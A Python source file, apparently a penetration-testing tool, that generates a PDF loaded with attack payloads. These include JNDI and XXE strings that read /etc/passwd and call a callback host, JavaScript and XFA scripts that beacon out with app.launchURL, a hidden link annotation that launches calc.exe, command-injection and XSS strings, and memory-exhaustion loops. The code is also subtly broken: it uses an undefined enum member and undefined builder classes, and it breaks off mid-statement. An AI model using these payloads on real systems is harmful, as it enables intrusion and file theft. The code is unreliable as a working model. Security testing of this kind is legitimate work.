"""
Modernized PDF Security Testing Tool
----------------------------------
Compatible with PyPDF2 3.0.0+ and current best practices for PDF manipulation
"""

import os
import io
import logging
import json
from datetime import datetime
from typing import Dict, List, Optional, Tuple, Any
from dataclasses import dataclass
import argparse
from enum import Enum
import warnings
import sys
from pathlib import Path
import hashlib
import time
import resource
from contextlib import contextmanager

# Third-party imports with version checking
try:
    from PyPDF2 import PdfWriter, PdfReader
    from PyPDF2.generic import (
        DictionaryObject,
        NameObject,
        TextStringObject,
        ArrayObject,
        NumberObject,
        BooleanObject,
        StreamObject,
        IndirectObject
    )
    import pkg_resources
    PYPDF2_VERSION = pkg_resources.get_distribution('PyPDF2').version
    if not PYPDF2_VERSION.startswith('3.'):
        warnings.warn("This tool requires PyPDF2 version 3.x", RuntimeWarning)
except ImportError:
    sys.exit("Required package PyPDF2 3.x not found. Please install with: pip install 'PyPDF2>=3.0.0'")

try:
    from reportlab.pdfgen import canvas
    from reportlab.lib.pagesizes import letter
except ImportError:
    sys.exit("Required package reportlab not found. Please install with: pip install reportlab")

class PayloadCategory(Enum):
    """Categories of security test payloads"""
    METADATA = "metadata"
    JAVASCRIPT = "javascript"
    XSS = "xss"
    SSRF = "ssrf"
    FILE_INCLUSION = "file_inclusion"
    COMMAND_INJECTION = "command_injection"
    XXE = "xxe"
    HTML_INJECTION = "html_injection"
    TEMPLATE_INJECTION = "template_injection"
    SVG_INJECTION = "svg_injection"
    EMBEDDED_FILES = "embedded_files"
    DIGITAL_SIGNATURES = "digital_signatures"
    PDF_STRUCTURE = "pdf_structure"
    FONT_ATTACKS = "font_attacks"
    XFA_FORMS = "xfa_forms"

@dataclass
class TestPayload:
    """Represents a security test payload with metadata"""
    name: str
    content: Any  # Can be string or PyPDF2 object
    category: PayloadCategory
    description: str
    viewer_requirements: List[str]
    expected_outcome: str
    severity: str
    mitigation: str
    tags: List[str] = None
    references: List[str] = None

class PDFSecurityTester:
    def __init__(self, callback_url: str, config: Optional[Dict] = None):
        """Initialize the modernized PDF Security Tester"""
        self.callback_url = callback_url
        self.test_id = hashlib.sha256(os.urandom(32)).hexdigest()[:12]
        self.config = config or {}
        
        self.inserted_payloads: List[TestPayload] = []
        self.execution_log: List[Dict] = []
        self.failed_payloads: List[Tuple[TestPayload, str]] = []
        
        self._setup_logging()

    def _setup_logging(self) -> None:
        """Set up logging with both file and console handlers"""
        self.logger = logging.getLogger('PDFSecurityTester')
        self.logger.setLevel(logging.INFO)
        
        # Add console handler
        console_handler = logging.StreamHandler()
        console_handler.setFormatter(logging.Formatter(
            '%(asctime)s - %(levelname)s - %(message)s'
        ))
        self.logger.addHandler(console_handler)
        
        # Add file handler
        log_file = f"pdf_security_test_{datetime.now().strftime('%Y%m%d_%H%M%S')}.log"
        file_handler = logging.FileHandler(log_file)
        file_handler.setFormatter(logging.Formatter(
            '%(asctime)s - %(name)s - %(levelname)s - %(message)s'
        ))
        self.logger.addHandler(file_handler)

    def add_metadata_payloads(self, writer: PdfWriter) -> None:
        """Add metadata-based test payloads using modern PyPDF2 API"""
        metadata_payloads = [
            TestPayload(
                name="JNDI Injection",
                content=DictionaryObject({
                    NameObject('/Title'): TextStringObject(
                        f'${{jndi:ldap://{self.callback_url}/metadata/{self.test_id}}}'
                    )
                }),
                category=PayloadCategory.METADATA,
                description="Tests JNDI injection via PDF metadata",
                viewer_requirements=["Adobe Acrobat"],
                expected_outcome="May trigger JNDI lookup in vulnerable environments",
                severity="High",
                mitigation="Sanitize metadata fields, disable JNDI lookups"
            ),
            TestPayload(
                name="XXE in Metadata",
                content=DictionaryObject({
                    NameObject('/Subject'): TextStringObject(
                        f'''<?xml version="1.0"?>
                        <!DOCTYPE data [
                            <!ENTITY file SYSTEM "file:///etc/passwd">
                        ]>
                        <data>&file;</data>'''
                    )
                }),
                category=PayloadCategory.XXE,
                description="Tests XXE injection via PDF metadata",
                viewer_requirements=["PDF processors with XML parsing"],
                expected_outcome="May read local files if XXE is not disabled",
                severity="High",
                mitigation="Disable XXE in XML parsers"
            )
        ]
        
        for payload in metadata_payloads:
            if self._should_include_payload(payload):
                try:
                    writer._info.update(payload.content)
                    self._record_payload_execution(payload, True)
                except Exception as e:
                    self.logger.error(f"Failed to add metadata payload {payload.name}: {str(e)}")
                    self._record_payload_execution(payload, False, str(e))

    def add_javascript_payloads(self, writer: PdfWriter) -> None:
        """Add JavaScript-based test payloads using modern PyPDF2 API"""
        js_payloads = [
            TestPayload(
                name="Cloud Metadata Access",
                content=DictionaryObject({
                    NameObject('/S'): NameObject('/JavaScript'),
                    NameObject('/JS'): TextStringObject(
                        f'app.launchURL("{self.callback_url}/js/aws_metadata/{self.test_id}");'
                    )
                }),
                category=PayloadCategory.JAVASCRIPT,
                description="Tests access to cloud provider metadata",
                viewer_requirements=["Adobe Acrobat with JavaScript"],
                expected_outcome="May trigger callbacks to metadata endpoints",
                severity="High",
                mitigation="Disable JavaScript execution"
            )
        ]
        
        for payload in js_payloads:
            if self._should_include_payload(payload):
                try:
                    action_obj = writer.add_object(payload.content)
                    writer.add_js(action_obj)
                    self._record_payload_execution(payload, True)
                except Exception as e:
                    self.logger.error(f"Failed to add JavaScript payload {payload.name}: {str(e)}")
                    self._record_payload_execution(payload, False, str(e))

    def add_embedded_file_payloads(self, writer: PdfWriter) -> None:
        """Add embedded file-based test payloads using modern PyPDF2 API"""
        embedded_payloads = [
            TestPayload(
                name="Executable Attachment",
                content=b"TVqQAAMAAAAEAAAA//8AALgAAAA...",  # Fake executable header
                category=PayloadCategory.EMBEDDED_FILES,
                description="Tests handling of executable file attachments",
                viewer_requirements=["PDF processors with attachment handling"],
                expected_outcome="Should be blocked or sanitized",
                severity="High",
                mitigation="Block executable attachments"
            ),
            TestPayload(
                name="Nested PDF",
                content=b"%PDF-1.7\n%¿÷¢\n1 0 obj\n<</Type/Catalog/Pages 2 0 R>>\nendobj\n%%EOF",
                category=PayloadCategory.EMBEDDED_FILES,
                description="Tests handling of nested PDF files",
                viewer_requirements=["Any PDF processor"],
                expected_outcome="Should be detected and analyzed",
                severity="Medium",
                mitigation="Scan nested PDFs"
            )
        ]
        
        for payload in embedded_payloads:
            if self._should_include_payload(payload):
                try:
                    # Use modern add_attachment method
                    writer.add_attachment(f"test_{payload.name}", payload.content)
                    self._record_payload_execution(payload, True)
                except Exception as e:
                    self.logger.error(f"Failed to add embedded payload {payload.name}: {str(e)}")
                    self._record_payload_execution(payload, False, str(e))

    def add_structure_payloads(self, writer: PdfWriter) -> None:
        """Add PDF structure-based test payloads using modern PyPDF2 API"""
        # Create a malformed stream object
        malformed_stream = StreamObject()
        malformed_stream._data = b"A" * 1000000  # Large stream
        malformed_stream.update({
            NameObject("/Length"): NumberObject(999999999)  # Invalid length
        })
        
        structure_payloads = [
            TestPayload(
                name="Malformed Stream",
                content=malformed_stream,
                category=PayloadCategory.PDF_STRUCTURE,
                description="Tests handling of malformed stream objects",
                viewer_requirements=["Any PDF processor"],
                expected_outcome="Should detect invalid length",
                severity="Medium",
                mitigation="Validate stream lengths"
            )
        ]
        
        for payload in structure_payloads:
            if self._should_include_payload(payload):
                try:
                    writer.add_object(payload.content)
                    self._record_payload_execution(payload, True)
                except Exception as e:
                    self.logger.error(f"Failed to add structure payload {payload.name}: {str(e)}")
                    self._record_payload_execution(payload, False, str(e))

    def _should_include_payload(self, payload: TestPayload) -> bool:
        """Determine if a payload should be included based on configuration"""
        if not self.config:
            return True
            
        if 'enabled_categories' in self.config:
            if payload.category.value not in self.config['enabled_categories']:
                return False
        
        if 'excluded_payloads' in self.config:
            if payload.name in self.config['excluded_payloads']:
                return False
        
        if 'min_severity' in self.config:
            severity_levels = {'Low': 0, 'Medium': 1, 'High': 2, 'Critical': 3}
            if severity_levels.get(payload.severity, 0) < severity_levels.get(self.config['min_severity'], 0):
                return False
        
        return True

    def _record_payload_execution(self, payload: TestPayload, success: bool, error: Optional[str] = None) -> None:
        """Record the execution status of a payload"""
        status = {
            'timestamp': datetime.now().isoformat(),
            'payload_name': payload.name,
            'category': payload.category.value,
            'success': success,
            'error': error if error else None
        }
        
        self.execution_log.append(status)
        
        if success:
            self.inserted_payloads.append(payload)
        else:
            self.failed_payloads.append((payload, error))
        
        log_level = logging.INFO if success else logging.ERROR
        self.logger.log(log_level, f"Payload {payload.name}: {'Success' if success else f'Failed - {error}'}")

    def add_font_payloads(self, writer: PdfWriter) -> None:
        """Add font-based test payloads"""
        font_builder = FontPayloadBuilder()
        
        font_payloads = [
            TestPayload(
                name="Malicious Font",
                content=font_builder.create_malicious_font(),
                category=PayloadCategory.FONT_ATTACKS,
                description="Tests font handling with malformed structures",
                viewer_requirements=["PDF processors with font support"],
                expected_outcome="Should handle malformed fonts gracefully",
                severity="High",
                mitigation="Validate font objects and limit size"
            )
        ]
        
        for payload in font_payloads:
            if self._should_include_payload(payload):
                try:
                    writer.add_object(payload.content)
                    self._record_payload_execution(payload, True)
                except Exception as e:
                    self.logger.error(f"Failed to add font payload {payload.name}: {str(e)}")
                    self._record_payload_execution(payload, False, str(e))

    def add_form_payloads(self, writer: PdfWriter) -> None:
        """Add XFA form-based test payloads"""
        form_builder = XFAFormBuilder(self.callback_url, self.test_id)
        
        form_payloads = [
            TestPayload(
                name="XFA Form",
                content=form_builder.create_xfa_form(),
                category=PayloadCategory.XFA_FORMS,
                description="Tests XFA form processing",
                viewer_requirements=["Adobe Acrobat"],
                expected_outcome="May execute JavaScript via XFA",
                severity="High",
                mitigation="Disable XFA processing"
            )
        ]
        
        for payload in form_payloads:
            if self._should_include_payload(payload):
                try:
                    writer.add_object(payload.content)
                    self._record_payload_execution(payload, True)
                except Exception as e:
                    self.logger.error(f"Failed to add form payload {payload.name}: {str(e)}")
                    self._record_payload_execution(payload, False, str(e))

    def add_annotation_payloads(self, writer: PdfWriter) -> None:
        """Add annotation-based test payloads"""
        annotation_builder = AnnotationBuilder(self.callback_url, self.test_id)
        
        annotation_payloads = [
            TestPayload(
                name="JavaScript Annotation",
                content=annotation_builder.create_javascript_annotation(),
                category=PayloadCategory.ANNOTATIONS,
                description="Tests JavaScript in annotations",
                viewer_requirements=["Adobe Acrobat"],
                expected_outcome="May execute JavaScript",
                severity="High",
                mitigation="Disable annotation scripts"
            ),
            TestPayload(
                name="Hidden Launch Action",
                content=annotation_builder.create_launch_action(),
                category=PayloadCategory.ANNOTATIONS,
                description="Tests hidden launch actions",
                viewer_requirements=["Adobe Acrobat"],
                expected_outcome="Should block launch actions",
                severity="Critical",
                mitigation="Disable launch actions"
            )
        ]
        
        for payload in annotation_payloads:
            if self._should_include_payload(payload):
                try:
                    writer.add_object(payload.content)
                    self._record_payload_execution(payload, True)
                except Exception as e:
                    self.logger.error(f"Failed to add annotation payload {payload.name}: {str(e)}")
                    self._record_payload_execution(payload, False, str(e))

    def add_xss_test_page(self, writer: PdfWriter) -> None:
        """Add a page with XSS test payloads"""
        buffer = io.BytesIO()
        c = canvas.Canvas(buffer, pagesize=letter)
        
        xss_payloads = [
            TestPayload(
                name="Basic XSS",
                content='<script>alert(document.domain)</script>',
                category=PayloadCategory.XSS,
                description="Basic XSS test",
                viewer_requirements=["PDF.js", "Adobe Acrobat"],
                expected_outcome="May execute JavaScript in vulnerable viewers",
                severity="High",
                mitigation="Sanitize rendered content"
            ),
            TestPayload(
                name="SVG XSS",
                content=f'''<svg>
                    <script>
                        fetch("{self.callback_url}/xss/svg/{self.test_id}")
                    </script>
                </svg>''',
                category=PayloadCategory.XSS,
                description="SVG-based XSS test",
                viewer_requirements=["PDF.js", "Adobe Acrobat"],
                expected_outcome="May execute JavaScript via SVG",
                severity="High",
                mitigation="Sanitize SVG content"
            )
        ]
        
        y_pos = 750
        for payload in xss_payloads:
            if self._should_include_payload(payload):
                try:
                    c.drawString(100, y_pos, payload.content)
                    self._record_payload_execution(payload, True)
                    y_pos -= 30
                except Exception as e:
                    self.logger.error(f"Failed to add XSS payload {payload.name}: {str(e)}")
                    self._record_payload_execution(payload, False, str(e))
        
        c.save()
        buffer.seek(0)
        reader = PdfReader(buffer)
        writer.add_page(reader.pages[0])

    def add_injection_test_page(self, writer: PdfWriter) -> None:
        """Add a page with various injection tests"""
        buffer = io.BytesIO()
        c = canvas.Canvas(buffer, pagesize=letter)
        
        injection_payloads = [
            TestPayload(
                name="Template Injection",
                content="{{7*7}} #{7*7} {{7*7}}",
                category=PayloadCategory.TEMPLATE_INJECTION,
                description="Tests template injection patterns",
                viewer_requirements=["Template processing systems"],
                expected_outcome="May execute template expressions",
                severity="Medium",
                mitigation="Disable template processing"
            ),
            TestPayload(
                name="Command Injection",
                content="$(cat /etc/passwd)",
                category=PayloadCategory.COMMAND_INJECTION,
                description="Tests command injection",
                viewer_requirements=["PDF processors with command execution"],
                expected_outcome="May execute shell commands",
                severity="Critical",
                mitigation="Sanitize input, disable command execution"
            ),
            TestPayload(
                name="XXE Injection",
                content=f'''<?xml version="1.0"?>
                    <!DOCTYPE test [
                        <!ENTITY % file SYSTEM "file:///etc/passwd">
                        <!ENTITY % dtd SYSTEM "http://{self.callback_url}/xxe/{self.test_id}">
                        %dtd;
                    ]>''',
                category=PayloadCategory.XXE,
                description="Tests XXE injection",
                viewer_requirements=["PDF processors with XML parsing"],
                expected_outcome="May read local files or make network requests",
                severity="High",
                mitigation="Disable XXE in XML parsers"
            )
        ]
        
        y_pos = 750
        for payload in injection_payloads:
            if self._should_include_payload(payload):
                try:
                    c.drawString(100, y_pos, payload.content)
                    self._record_payload_execution(payload, True)
                    y_pos -= 30
                except Exception as e:
                    self.logger.error(f"Failed to add injection payload {payload.name}: {str(e)}")
                    self._record_payload_execution(payload, False, str(e))
        
        c.save()
        buffer.seek(0)
        reader = PdfReader(buffer)
        writer.add_page(reader.pages[0])

    def add_render_test_page(self, writer: PdfWriter) -> None:
        """Add a page with rendering-based tests"""
        buffer = io.BytesIO()
        c = canvas.Canvas(buffer, pagesize=letter)
        
        render_payloads = [
            TestPayload(
                name="SVG with External Entity",
                content=f'''
                <svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
                    <image href="file:///etc/passwd" x="0" y="0" height="100" width="100"/>
                    <image href="{self.callback_url}/svg/image/{self.test_id}" x="0" y="0" height="100" width="100"/>
                </svg>''',
                category=PayloadCategory.SVG_INJECTION,
                description="Tests SVG external entity handling",
                viewer_requirements=["PDF.js", "Adobe Acrobat"],
                expected_outcome="May load external resources",
                severity="High",
                mitigation="Sanitize SVG content"
            ),
            TestPayload(
                name="HTML Injection",
                content=f'''
                <html>
                    <body>
                        <img src="{self.callback_url}/html/img/{self.test_id}" />
                        <iframe src="file:///etc/passwd"></iframe>
                    </body>
                </html>''',
                category=PayloadCategory.HTML_INJECTION,
                description="Tests HTML content handling",
                viewer_requirements=["PDF viewers with HTML support"],
                expected_outcome="May render HTML and load resources",
                severity="High",
                mitigation="Sanitize HTML content"
            )
        ]
        
        y_pos = 750
        for payload in render_payloads:
            if self._should_include_payload(payload):
                try:
                    c.drawString(100, y_pos, payload.content)
                    self._record_payload_execution(payload, True)
                    y_pos -= 50
                except Exception as e:
                    self.logger.error(f"Failed to add render payload {payload.name}: {str(e)}")
                    self._record_payload_execution(payload, False, str(e))
        
        c.save()
        buffer.seek(0)
        reader = PdfReader(buffer)
        writer.add_page(reader.pages[0])

    def add_resource_exhaustion_tests(self, writer: PdfWriter) -> None:
        """Add tests for resource exhaustion vulnerabilities"""
        builder = ResourceExhaustionBuilder()
        
        try:
            # Add large page
            writer.add_blank_page(width=100000, height=100000)
            
            # Add deeply nested dictionary
            writer.add_object(builder.create_nested_dictionary())
            
            # Add large stream with invalid length
            writer.add_object(builder.create_large_stream())
            
            self._record_payload_execution(
                TestPayload(
                    name="Resource Exhaustion",
                    content="Large objects and invalid structures",
                    category=PayloadCategory.PDF_STRUCTURE,
                    description="Tests resource limits and handling of large objects",
                    viewer_requirements=["Any PDF processor"],
                    expected_outcome="Should handle gracefully",
                    severity="Medium",
                    mitigation="Implement resource limits"
                ),
                True
            )
        except Exception as e:
            self.logger.error(f"Error in add_resource_exhaustion_tests: {str(e)}")
            self._record_payload_execution(
                TestPayload(
                    name="Resource Exhaustion",
                    content="",
                    category=PayloadCategory.PDF_STRUCTURE,
                    description="Tests failed",
                    viewer_requirements=[],
                    expected_outcome="",
                    severity="Medium",
                    mitigation=""
                ),
                False,
                str(e)
            )

    def add_malformed_structure_payloads(self, writer: PdfWriter) -> None:
        """Add tests for malformed PDF structures"""
        structure_payloads = [
            TestPayload(
                name="Overlapping Objects",
                content=DictionaryObject({
                    NameObject('/Type'): NameObject('/Pages'),
                    NameObject('/Kids'): ArrayObject([
                        # Create a circular reference
                        IndirectObject(1, 0, writer),
                        IndirectObject(1, 0, writer)  # Same object referenced twice
                    ])
                }),
                category=PayloadCategory.PDF_STRUCTURE,
                description="Tests handling of overlapping object numbers",
                viewer_requirements=["Any PDF processor"],
                expected_outcome="Should detect and reject duplicate objects",
                severity="High",
                mitigation="Validate object numbering"
            ),
            TestPayload(
                name="Circular References",
                content=DictionaryObject({
                    NameObject('/Type'): NameObject('/Pages'),
                    NameObject('/Parent'): IndirectObject(2, 0, writer),
                    NameObject('/Kids'): ArrayObject([
                        IndirectObject(1, 0, writer)  # Self-reference
                    ])
                }),
                category=PayloadCategory.PDF_STRUCTURE,
                description="Tests handling of circular object references",
                viewer_requirements=["Any PDF processor"],
                expected_outcome="Should detect circular references",
                severity="High",
                mitigation="Check for circular references"
            ),
            TestPayload(
                name="Invalid Object Stream",
                content=StreamObject({
                    NameObject('/Type'): NameObject('/ObjStm'),
                    NameObject('/N'): NumberObject(999999),  # Invalid number of objects
                    NameObject('/First'): NumberObject(0)
                }),
                category=PayloadCategory.PDF_STRUCTURE,
                description="Tests handling of invalid object streams",
                viewer_requirements=["Any PDF processor"],
                expected_outcome="Should detect invalid object streams",
                severity="Medium",
                mitigation="Validate object streams"
            )
        ]
        
        for payload in structure_payloads:
            if self._should_include_payload(payload):
                try:
                    writer.add_object(payload.content)
                    self._record_payload_execution(payload, True)
                except Exception as e:
                    self.logger.error(f"Failed to add structure payload {payload.name}: {str(e)}")
                    self._record_payload_execution(payload, False, str(e))

    def add_advanced_javascript_payloads(self, writer: PdfWriter) -> None:
        """Add advanced JavaScript execution tests"""
        js_payloads = [
            TestPayload(
                name="Hidden Layer JavaScript",
                content=DictionaryObject({
                    NameObject('/S'): NameObject('/JavaScript'),
                    NameObject('/JS'): TextStringObject(f'''
                        var layer = this.addLayer("HiddenLayer");
                        layer.enabled = false;
                        layer.onClick = function() {{
                            app.launchURL("{self.callback_url}/layer/{self.test_id}");
                        }};
                    ''')
                }),
                category=PayloadCategory.JAVASCRIPT,
                description="Tests JavaScript execution in hidden layers",
                viewer_requirements=["Adobe Acrobat"],
                expected_outcome="May execute JavaScript when layer is toggled",
                severity="High",
                mitigation="Disable JavaScript in layers"
            ),
            TestPayload(
                name="Resource Exhaustion",
                content=DictionaryObject({
                    NameObject('/S'): NameObject('/JavaScript'),
                    NameObject('/JS'): TextStringObject('''
                        var arr = [];
                        while(true) {
                            arr.push(new Array(1000000).join('A'));
                        }
                    ''')
                }),
                category=PayloadCategory.JAVASCRIPT,
                description="Tests memory exhaustion protection",
                viewer_requirements=["PDF processors with JavaScript"],
                expected_outcome="Should be prevented by memory limits",
                severity="High",
                mitigation="Implement JavaScript resource limits"
            ),
            TestPayload(
                name="DOM-Based XSS",
                content=DictionaryObject({
                    NameObject('/S'): NameObject('/JavaScript'),
                    NameObject('/JS'): TextStringObject(f'''
                        var url = app.media.getURLData();
                        var decoded = decodeURIComponent(url);
                        app.alert(decoded);
                        app.launchURL("{self.callback_url}/xss/dom/" + decoded);
                    ''')
                }),
                category=PayloadCategory.XSS,
                description="Tests DOM-based XSS in PDF viewers",
                viewer_requirements=["PDF viewers with DOM access"],
                expected_outcome="May execute XSS via URL parameters",
                severity="High",
                mitigation="Sanitize URL parameters"
            )
        ]
        
        for payload in js_payloads:
            if self._should_include_payload(payload):
                try:
                    action_obj = writer.add_object(payload.content)
                    writer.add_js(action_obj)
                    self._record_payload_execution(payload, True)
                except Exception as e:
                    self.logger.error(f"Failed to add advanced JS payload {payload.name}: {str(e)}")
                    self._record_payload_execution(payload, False, str(e))

    def add_advanced_annotation_payloads(self, writer: PdfWriter) -> None:
        """Add advanced annotation-based test payloads"""
        annotation_payloads = [
            TestPayload(
                name="Dynamic Annotation",
                content=DictionaryObject({
                    NameObject('/Type'): NameObject('/Annot'),
                    NameObject('/Subtype'): NameObject('/Widget'),
                    NameObject('/FT'): NameObject('/Tx'),
                    NameObject('/AA'): DictionaryObject({
                        NameObject('/K'): DictionaryObject({
                            NameObject('/S'): NameObject('/JavaScript'),
                            NameObject('/JS'): TextStringObject(
                                f'app.launchURL("{self.callback_url}/annot/dynamic/{self.test_id}");'
                            )
                        })
                    })
                }),
                category=PayloadCategory.ANNOTATIONS,
                description="Tests dynamic annotation behaviors",
                viewer_requirements=["PDF viewers with annotation support"],
                expected_outcome="May execute JavaScript on interaction",
                severity="High",
                mitigation="Disable annotation scripts"
            ),
            TestPayload(
                name="Hidden Launch Action",
                content=DictionaryObject({
                    NameObject('/Type'): NameObject('/Annot'),
                    NameObject('/Subtype'): NameObject('/Link'),
                    NameObject('/Rect'): ArrayObject([
                        NumberObject(0), NumberObject(0),
                        NumberObject(0), NumberObject(0)
                    ]),
                    NameObject('/F'): NumberObject(2),  # Hidden flag
                    NameObject('/A'): DictionaryObject({
                        NameObject('/Type'): NameObject('/Action'),
                        NameObject('/S'): NameObject('/Launch'),
                        NameObject('/F'): TextStringObject('calc.exe')
                    })
                }),
                category=PayloadCategory.ANNOTATIONS,
                description="Tests hidden launch actions",
                viewer_requirements=["Adobe Acrobat"],
                expected_outcome="Should block launch actions",
                severity="Critical",
                mitigation="Disable launch actions"
            )
        ]
        
        for payload in annotation_payloads:
            if self._should_include_payload(payload):
                try:
                    writer.add_object(payload.content)
                    self._record_payload_execution(payload, True)
                except Exception as e:
                    self.logger.error(f"Failed to add annotation payload {payload.name}: {str(e)}")
                    self._record_payload_execution(payload, False, str(e))

    def add_dangerous_structure_payloads(self, writer: PdfWriter) -> None:
        """Add tests for dangerous PDF structures"""
        structure_payloads = [
            TestPayload(
                name="Overlapping Objects Stream",
                content=DictionaryObject({
                    NameObject('/Type'): NameObject('/ObjStm'),
                    NameObject('/N'): NumberObject(2),
                    NameObject('/First'): NumberObject(20),
                    NameObject('/_stream_data'): b'1 0 2 0 << /Type /Catalog >> << /Type /Pages >>'
                }),
                category=PayloadCategory.PDF_STRUCTURE,
                description="Tests handling of overlapping objects in streams",
                viewer_requirements=["Any PDF processor"],
                expected_outcome="Should detect object collisions",
                severity="High",
                mitigation="Validate object streams"
            ),
            TestPayload(
                name="Circular References Stream",
                content=DictionaryObject({
                    NameObject('/Type'): NameObject('/ObjStm'),
                    NameObject('/N'): NumberObject(2),
                    NameObject('/First'): NumberObject(20),
                    NameObject('/_stream_data'): b'1 0 2 0 << /Parent 2 0 R >> << /Kids [1 0 R] >>'
                }),
                category=PayloadCategory.PDF_STRUCTURE,
                description="Tests handling of circular references in streams",
                viewer_requirements=["Any PDF processor"],
                expected_outcome="Should detect circular references",
                severity="High",
                mitigation="Check for reference cycles"
            )
        ]
        
        for payload in structure_payloads:
            if self._should_include_payload(payload):
                try:
                    writer.add_object(payload.content)
                    self._record_payload_execution(payload, True)
                except Exception as e:
                    self.logger.error(f"Failed to add structure payload {payload.name}: {str(e)}")
                    self._record_payload_execution(payload, False, str(e))

    def _generate_detailed_report(self, pdf_path: str) -> None:
        """Generate a detailed security test report"""
        report = {
            'timestamp': datetime.now().isoformat(),
            'pdf_path': pdf_path,
            'test_id': self.test_id,
            'callback_url': self.callback_url,
            'statistics': {
                'total_payloads': len(self.execution_log),
                'successful_payloads': len(self.inserted_payloads),
                'failed_payloads': len(self.failed_payloads)
            },
            'configuration': self.config,
            'execution_log': self.execution_log,
            'payloads': [
                {
                    'name': p.name,
                    'category': p.category.value,
                    'description': p.description,
                    'viewer_requirements': p.viewer_requirements,
                    'expected_outcome': p.expected_outcome,
                    'severity': p.severity,
                    'mitigation': p.mitigation,
                    'tags': p.tags,
                    'references': p.references
                }
                for p in self.inserted_payloads
            ],
            'security_recommendations': [
                {
                    'category': 'JavaScript',
                    'recommendation': 'Disable JavaScript execution in PDF viewers',
                    'impact': 'High',
                    'implementation': 'Configure PDF viewer security settings'
                },
                {
                    'category': 'Attachments',
                    'recommendation': 'Block executable attachments',
                    'impact': 'High',
                    'implementation': 'Implement attachment filtering'
                },
                {
                    'category': 'Forms',
                    'recommendation': 'Disable XFA form processing',
                    'impact': 'Medium',
                    'implementation': 'Configure form processing settings'
                },
                {
                    'category': 'Structure',
                    'recommendation': 'Implement PDF structure validation',
                    'impact': 'High',
                    'implementation': 'Add PDF structure checks'
                }
            ]
        }
        
        report_path = f"{pdf_path}.report.json"
        with open(report_path, 'w') as f:
            json.dump(report, f, indent=2)
        
        self.logger.info(f"Detailed test report generated: {report_path}")

    def create_security_test_pdf(self, output_path: str) -> None:
        """Create a PDF with all security test payloads"""
        writer = PdfWriter()
        
        try:
            # Add basic tests
            self.add_metadata_payloads(writer)
            self.add_javascript_payloads(writer)
            self.add_embedded_file_payloads(writer)
            self.add_structure_payloads(writer)
            
            # Add advanced tests
            self.add_font_payloads(writer)
            self.add_form_payloads(writer)
            self.add_annotation_payloads(writer)
            
            # Add malformed structure tests
            self.add_malformed_structure_payloads(writer)
            
            # Add advanced JavaScript tests
            self.add_advanced_javascript_payloads(writer)
            
            # Add advanced annotation tests
            self.add_advanced_annotation_payloads(writer)
            
            # Add dangerous structure tests
            self.add_dangerous_structure_payloads(writer)
            
            # Add test pages
            self.add_xss_test_page(writer)
            self.add_injection_test_page(writer)
            self.add_render_test_page(writer)
            
            # Add resource exhaustion tests last
            self.add_resource_exhaustion_tests(writer)
            
            # Save the PDF
            with open(output_path, 'wb') as output_file:
                writer.write(output_file)
            
            # Generate detailed report
            self._generate_detailed_report(output_path)
            
        except Exception as e:
            self.logger.error(f"Error creating security test PDF: {str(e)}")
            raise

    def _generate_report(self, pdf_path: str) -> None:
        """Generate a test report"""
        report = {
            'timestamp': datetime.now().isoformat(),
            'pdf_path': pdf_path,
            'test_id': self.test_id,
            'statistics': {
                'total_payloads': len(self.execution_log),
                'successful_payloads': len(self.inserted_payloads),
                'failed_payloads': len(self.failed_payloads)
            }
        }
        
        report_path = f"{pdf_path}.report.json"
        with open(report_path, 'w') as f:
            json.dump(report, f, indent=2)
        
        self.logger.info(f"Test report generated: {report_path}")

def main():
    """Main function with improved argument handling"""
    parser = argparse.ArgumentParser(
        description='PDF Security Test Generator - FOR AUTHORIZED TESTING ONLY'
    )
    parser.add_argument('--callback-host', required=True, help='Callback host for SSRF tests')
    parser.add_argument('--callback-port', required=True, help='Callback port')
    parser.add_argument('--output', default='security_test.pdf', help='Output PDF path')
    parser.add_argument('--config', help='Path to configuration JSON file')
    parser.add_argument('--verbose', action='store_true', help='Enable verbose logging')
    
    args = parser.parse_args()
    
    # Set up logging
    log_level = logging.DEBUG if args.verbose else logging.INFO
    logging.basicConfig(level=log_level)
    
    logger = logging.getLogger('PDFSecurityTester')
    logger.warning("""
    ⚠️  WARNING: This tool generates PDFs containing security test payloads.
    Only use in authorized, controlled environments for security testing.
    Never use against production systems without explicit permission.
    """)
    
    try:
        # Load configuration if provided
        config = None
        if args.config:
            with open(args.config) as f:
                config = json.load(f)
        
        callback_url = f"http://{args.callback_host}:{args.callback_port}"
        
        # Create and run the tester
        tester = PDFSecurityTester(callback_url, config)
        tester.create_security_test_pdf(args.output)
        
        print("\nPDF Security Test Suite - Complete")
        print(f"\nGenerated files:")
        print(f"1. Test PDF: {args.output}")
        print(f"2. Test Report: {args.output}.report.json")
        
        print("\nNext Steps:")
        print("1. Review the test report for payload details")
        print("2. Upload the PDF to your testing environment")
        print("3. Monitor the callback URL for active payloads")
        print("4. Test with different PDF viewers:")
        print("   - Adobe Acrobat DC (JavaScript execution)")
        print("   - PDF.js (Content rendering)")
        print("   - Chrome PDF Viewer (Basic rendering)")
        print("5. Review processing logs for errors")
        
    except Exception as e:
        logger.error(f"Error running security tests: {str(e)}")
        sys.exit(1)

class FontPayloadBuilder:
    """Builder for creating malicious font payloads"""
    
    @staticmethod
    def create_malicious_font() -> DictionaryObject:
        """Create a malicious font object using PyPDF2 objects"""
        # Create encoding dictionary with large differences array
        encoding_dict = DictionaryObject({
            NameObject('/Type'): NameObject('/Encoding'),
            NameObject('/Differences'): ArrayObject([
                NumberObject(1),
                *[NameObject(f'/A{i}' * 100) for i in range(100)]  # Large names
            ])
        })
        
        # Create font dictionary
        font_dict = DictionaryObject({
            NameObject('/Type'): NameObject('/Font'),
            NameObject('/Subtype'): NameObject('/Type1'),
            NameObject('/BaseFont'): NameObject('/' + ('A' * 1000)),  # Long name
            NameObject('/Encoding'): encoding_dict
        })
        
        return font_dict

class XFAFormBuilder:
    """Builder for creating XFA form payloads"""
    
    def __init__(self, callback_url: str, test_id: str):
        self.callback_url = callback_url
        self.test_id = test_id
    
    def create_xfa_form(self) -> DictionaryObject:
        """Create an XFA form with JavaScript execution"""
        xfa_template = f"""<?xml version="1.0" encoding="UTF-8"?>
        <xdp:xdp xmlns:xdp="http://ns.adobe.com/xdp/">
            <template xmlns="http://www.xfa.org/schema/xfa-template/3.3/">
                <script contentType="application/x-javascript">
                    app.alert('XFA Execution');
                    app.launchURL("{self.callback_url}/xfa/{self.test_id}");
                </script>
            </template>
        </xdp:xdp>"""
        
        # Create stream object for XFA template
        xfa_stream = StreamObject()
        xfa_stream._data = xfa_template.encode()
        xfa_stream.update({
